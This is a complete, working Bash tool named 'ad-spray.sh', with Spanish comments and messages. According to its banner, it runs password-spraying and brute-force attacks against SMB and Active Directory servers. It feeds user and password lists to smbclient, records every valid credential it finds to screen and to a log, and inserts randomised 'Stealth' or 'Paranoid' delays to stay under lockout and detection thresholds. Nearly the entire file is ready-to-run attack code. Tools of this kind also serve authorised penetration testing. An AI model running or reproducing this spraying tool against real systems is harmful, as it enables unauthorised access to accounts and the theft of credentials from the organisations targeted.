#!/bin/bash
# Autor: Federico Galarza
# LinkedIn: linkedin.com/in/federico-galarza

# Colores
b="\e[1m"            # Texto bold
B="\e[94m"           # Azul
C="\e[96m"           # Cyan
G="\e[38;5;82m"      # Verde
M="\e[95m"           # Magenta
R="\e[31m"           # Rojo
Y="\e[38;5;226m"     # Amarillo
NF="\e[0m"           # Normal format

# Variables globales
SCRIPT_NAME="ad-spray.sh"
VERSION=1.2
COMMAND="smbclient"
SMB_PORT="445"
LOG_FILE=""
SLEEP_SCALE=2 # Valor por defecto de -t
MAX_COUNTER_CONNECT=10
TOTAL_PASSWORDS=0
TOTAL_USERS=0
TOTAL_COMBINATIONS=0
VALID_CREDENTIALS=0

function banner(){
    echo -e "
  ▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰
${M}${b}   AD - Spray ${NF}
${M}   Version: ${Y}$VERSION ${NF} 

   Script bash que realiza ataques de password Sprying y de fuerza  
   bruta sobre servidores SMB, utilizando la herramienta smbclient. 
  ▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰
  "
}


# Ayuda
function usage() {
    echo -e "${B}  [i]${NF} Modo de uso: ${G}$SCRIPT_NAME${NF} -U [archivo_usuarios] -P [archivo_contraseñas] -s [servidor_SMB]"
    echo -e "${B}  [+]${NF} Opciones:"
    echo -e "      ${Y}-U${NF}    Archivo con la lista de usuarios (uno por línea)"
    echo -e "      ${Y}-u${NF}    Un único usuario"
    echo -e "      ${Y}-P${NF}    Archivo con la lista de contraseñas (una por línea)"
    echo -e "      ${Y}-p${NF}    Una única contraseña"
    echo -e "      ${Y}-s${NF}    Servidor SMB (por ejemplo, 192.168.1.10)"
    echo -e "      ${Y}-d${NF}    Dominio (opcional)"
    echo -e "      ${Y}-t${NF}    Nivel de agresividad (1: Paranoid, 2: Stealth (por defecto), 3: Fast, 4: More fast, 5: Insane)"
    echo -e "      ${Y}-h${NF}    Muestra la ayuda."
    exit 1
}


# Comprobar si smbclient está instalado
function smbclient_checker() {
    if ! [ -x "$(command -v $COMMAND)" ]; then
        {
            echo -e "\n${Y}  [!]${NF} Debe instalar ${G}$COMMAND${NF} para poder utilizar ${G}$SCRIPT_NAME ${NF}" 
            echo -e "${B}  [i]${NF} Intente instalar con: \n"
            echo -e "${R}     $(whoami 2>/dev/null)@$(hostname 2>/dev/null):${C}~${NF}$ sudo apt install $COMMAND"
            exit 1
        }
    fi
}


# Comprobar conectividad
function port_checker() {
    local host=$1
    local port=$2

    if timeout 1 bash 2>/dev/null -c "</dev/tcp/$host/$port " ; then
        return 0
    else
        return 1
    fi
}


# Reportar estado de conectividad
function connect_checker() {
    local host=$1
    local port=$2
    local opt=$3

    case "$opt" in
        init_check) 
            echo -e "${B}  [i]${NF} Chequeando conectividad con el servidor SMB${C} $host:$port ${NF}"
            if port_checker $SERVER $SMB_PORT; then
                echo -e "${G}  [i]${NF} Ok, continuando ...\n"
            else
                echo -e "${Y}  [!]${NF} No hay conectividad con el servidor SMB. \n"
                exit 1
            fi 
        ;;
        auto_check) 
            ((counter++))
            if (( counter >= MAX_COUNTER_CONNECT )); then
                counter=0
                while true; do
                    echo -e "${B}  [i]${NF} Chequeando conectividad con el servidor SMB${C} $host:$port ${NF}"
                    if port_checker $SERVER $SMB_PORT; then
                        echo -e "${G}  [i]${NF} Ok, continuando ...\n"
                        break
                    else
                        echo -e "${Y}  [!]${NF} No hay conectividad con el servidor SMB. \n"
                        echo -e "${B}  [i]${NF} Presione una Enter o Espacio para reintentar o CTRL+C para cancelar.\n"
                            while true; do
                                read -sn 1  KEY < /dev/tty
                                if [[ $KEY = '' ]]; then 
                                    echo -e "${B}  [+]${NF} Reintentando... \n"
                                    break
                                fi
                            done
                    fi
                done
            fi
        ;;
    esac
}


# Manejar CTRL+C
trap ctrl_c INT
function ctrl_c() {
    echo -e "\n${Y}  [!]${NF} Cancelando ejecución..."
    report_stats
    if [[ -n "$LOG_FILE" ]]; then
        {
            write_log message "[!] Ejecución cancelada."
            write_log fin
        } >> "$LOG_FILE"
    fi
    tput cnorm
    exit 1
}


# Escribir en el log
function write_log() {
    local event=$1
    shift
    local message="$*"
    case "$event" in
        ini)
            echo "#############################################################################" >> "$LOG_FILE"
            echo "$(date '+%Y-%m-%d %T') | [i] Inicio del script" >> "$LOG_FILE"
            ;;
        fin)
            echo "$(date '+%Y-%m-%d %T') | [i] Fin del script" >> "$LOG_FILE"
            echo "#############################################################################" >> "$LOG_FILE"
            ;;
        message)
            echo "$(date '+%Y-%m-%d %T') | $message" >> "$LOG_FILE"
            ;;
        info)
            echo "$message" >> "$LOG_FILE"
            ;;
        *)
            echo "Error: Evento desconocido para write_log: $event" >&2
            ;;
    esac
}


# Generar tiempo de espera aleatorio
function random_sleep() {
    local min max
    case $SLEEP_SCALE in
        1) min=21; max=60 ;; # Paranoid
        2) min=11; max=20 ;; # Stealth
        3) min=5;  max=10  ;; # Fast
        4) min=1;  max=4  ;; # More fast
        5) min=0;  max=1  ;; # Insane
        *) min=11; max=20 ;; # Default (Stealth)
    esac
    local sleep_time=$(shuf -i "$min-$max" -n 1)
    echo -e "${B}  [i]${NF} Esperando $sleep_time segundos antes de continuar... \n"
    sleep "$sleep_time"
}


# Rastrear estadísticas
function track_stats() {
    local type=$1
    local users_file=$2
    local passwords_file=$2

    case "$type" in
        user) TOTAL_USERS=$(wc -w "$users_file" 2>/dev/null | cut -d " " -f 1) ;;
        password) TOTAL_PASSWORDS=$(wc -w "$passwords_file" 2>/dev/null | cut -d " " -f 1) ;;
        suser) TOTAL_USERS=1 ;;
        spass) TOTAL_PASSWORDS=1 ;;
        combinations) ((TOTAL_COMBINATIONS++));;
        valid) ((VALID_CREDENTIALS++)) ;;
        *) echo "Error: Tipo de estadística no reconocida: $type" >&2 ;;
    esac
}


# Validar parámetros
function validate_parameters() {
    if [[ -z "$SERVER" || (-z "$USERS_FILE" && -z "$SINGLE_USER") || (-z "$PASSWORDS_FILE" && -z "$SINGLE_PASSWORD") ]]; then
        echo -e "${Y}  [!]${NF} Error: Parámetros faltantes. \n"
        usage
    fi

    if [[ -n "$USERS_FILE" && -n "$SINGLE_USER" ]]; then
        echo -e "${Y}  [!]${NF} Error: No se puede usar -U y -u al mismo tiempo. \n"
        usage
    fi
    if [[ -n "$PASSWORDS_FILE" && -n "$SINGLE_PASSWORD" ]]; then
        echo -e "${Y}  [!]${NF} Error: No se puede usar -P y -p al mismo tiempo. \n"
        usage
    fi

    if [[ -n "$USERS_FILE" && ! -f "$USERS_FILE" ]]; then
        echo -e "${Y}  [!]${NF} Error: Archivo de usuarios no encontrado: $USERS_FILE"
        exit 1
    fi
    if [[ -n "$PASSWORDS_FILE" && ! -f "$PASSWORDS_FILE" ]]; then
        echo -e "${Y}  [!]${NF} Error: Archivo de contraseñas no encontrado: $PASSWORDS_FILE"
        exit 1
    fi
}


# Probar credenciales
function test_credentials() {
    local user=$1
    local password=$2
    local server=$3
    local domain=$4

    track_stats combinations

    [[ "$domain" == "default" ]] && domain=""
    if $COMMAND -L "$server" -U "$user%$password" ${domain:+-W "$domain"} &>/dev/null; then
        echo -e "${G}  [!]${NF} Credenciales válidas: $user:$password \n"
        write_log message "[!] Credenciales válidas: $user:$password"
        track_stats valid
        return 0
    else
        echo -e "${R}  [x]${NF} Credenciales no válidas: $user:$password \n"
        return 1
    fi
}


# Eliminar los retorno de carro de archivos creados en Windows
function normalize_files() {
    local file=$1
    sed -i 's/\r$//' "$file" 2>/dev/null
}


# Procesar una lista de usuarios y una lista de contraseñas
function process_users_and_passwords() {
    local users_file=$1
    local passwords_file=$2
    local server=$3
    local domain=$4

    normalize_files "$users_file"
    normalize_files "$passwords_file"

    while IFS= read -r password; do
        [[ -z "$password" ]] && continue
        while IFS= read -r user; do
            [[ -z "$user" ]] && continue
            echo -e "${B}  [i]${NF} Probando ..."
            echo -e "     - Usuario: $Y$user$NF"
            echo -e "     - Contraseña: $Y$password$NF\n"
            test_credentials "$user" "$password" "$server" "$domain"
            connect_checker "$SERVER" "$SMB_PORT" "auto_check"
            random_sleep
        done < "$users_file"
    done < "$passwords_file"
}


# Procesar un usuario único y una lista de contraseñas
function process_single_user_and_passwords() {
    local user=$1
    local passwords_file=$2
    local server=$3
    local domain=$4

    normalize_files "$passwords_file"
    while IFS= read -r password; do
        [[ -z "$password" ]] && continue
        echo -e "${B}  [i]${NF} Probando ..."
        echo -e "     - usuario:$Y $user $NF"
        echo -e "     - contraseña:$Y $password $NF\n"
        test_credentials "$user" "$password" "$server" "$domain"
        connect_checker "$SERVER" "$SMB_PORT" "auto_check"
        random_sleep
    done < "$passwords_file"
}


# Procesar una lista de usuarios y una contraseña única
function process_users_and_single_password() {
    local users_file=$1
    local password=$2
    local server=$3
    local domain=$4

    normalize_files "$users_file"

    while IFS= read -r user; do
        [[ -z "$user" ]] && continue
        echo -e "${B}  [i]${NF} Probando ..."
        echo -e "     - usuario:$Y $user $NF"
        echo -e "     - contraseña:$Y $password $NF\n"
        test_credentials "$user" "$password" "$server" "$domain"
        connect_checker "$SERVER" "$SMB_PORT" "auto_check"
        random_sleep
    done < "$users_file"
}


# Procesar un usuario único y una contraseña única
function process_single_user_and_password() {
    local user=$1
    local password=$2
    local server=$3
    local domain=$4

    echo -e "${B}  [i]${NF} Probando ..."
    echo -e "     - usuario:$Y $user $NF"
    echo -e "     - contraseña:$Y $password $NF\n"
    test_credentials "$user" "$password" "$server" "$domain"
}


# Procesar combinaciones
function process_combination() {
    if [[ -n "$USERS_FILE" && -n "$PASSWORDS_FILE" ]]; then
        write_log ini
        track_stats user "$USERS_FILE"
        track_stats password "$PASSWORDS_FILE"
        process_users_and_passwords "$USERS_FILE" "$PASSWORDS_FILE" "$SERVER" "$DOMAIN"
        report_stats
        write_log fin
    elif [[ -n "$SINGLE_USER" && -n "$PASSWORDS_FILE" ]]; then
        write_log ini
        track_stats suser
        track_stats password "$PASSWORDS_FILE"
        process_single_user_and_passwords "$SINGLE_USER" "$PASSWORDS_FILE" "$SERVER" "$DOMAIN"
        report_stats
        write_log fin
    elif [[ -n "$USERS_FILE" && -n "$SINGLE_PASSWORD" ]]; then
        write_log ini
        track_stats user "$USERS_FILE"
        track_stats spass
        process_users_and_single_password "$USERS_FILE" "$SINGLE_PASSWORD" "$SERVER" "$DOMAIN"
        report_stats
        write_log fin
    elif [[ -n "$SINGLE_USER" && -n "$SINGLE_PASSWORD" ]]; then
        write_log ini
        track_stats suser
        track_stats spass
        process_single_user_and_password "$SINGLE_USER" "$SINGLE_PASSWORD" "$SERVER" "$DOMAIN"
        report_stats
        write_log fin
    else
        echo -e "${Y}  [!]${NF} Error: Combinación de parámetros no válida."
        usage
        exit 1
    fi
}


# Reportar estadísticas
function report_stats() {
    echo -e "${B}  [i]${NF} Resumen de ejecución:"
    echo -e "    - Usuarios probados: $TOTAL_USERS"
    echo -e "    - Contraseñas probadas: $TOTAL_PASSWORDS"
    echo -e "    - Combinaciones probadas: $TOTAL_COMBINATIONS"
    echo -e "    - Combinaciones válidas encontradas: $VALID_CREDENTIALS"

    write_log message "[i] Resumen:"
    write_log message "    - Usuarios probados: $TOTAL_USERS"
    write_log message "    - Contraseñas probadas: $TOTAL_PASSWORDS"
    write_log message "    - Combinaciones probadas: $TOTAL_COMBINATIONS"
    write_log message "    - Combinaciones válidas encontradas: $VALID_CREDENTIALS"

}


## Main

banner
smbclient_checker

# Parseo de parámetros
while getopts "U:u:P:p:s:d:t:h" opt; do
    case "$opt" in
        U) USERS_FILE="$OPTARG" ;;
        u) SINGLE_USER="$OPTARG" ;;
        P) PASSWORDS_FILE="$OPTARG" ;;
        p) SINGLE_PASSWORD="$OPTARG" ;;
        s) SERVER="$OPTARG" ;;
        d) DOMAIN="$OPTARG" ;;
        t) SLEEP_SCALE="$OPTARG" 
            if ! [[ "$SLEEP_SCALE" =~ ^[1-5]$ ]]; then
                echo -e "\n${Y}  [!]${NF} Error: El valor de -t debe estar entre 1 y 5."
                banner
                usage
            fi ;;
        h) banner ; usage ;;
        *) banner ; usage ;;
    esac
done

DOMAIN=${DOMAIN:-"default"}
LOG_FILE="spray_${DOMAIN}.log"

validate_parameters
connect_checker $SERVER $SMB_PORT init_check
process_combination
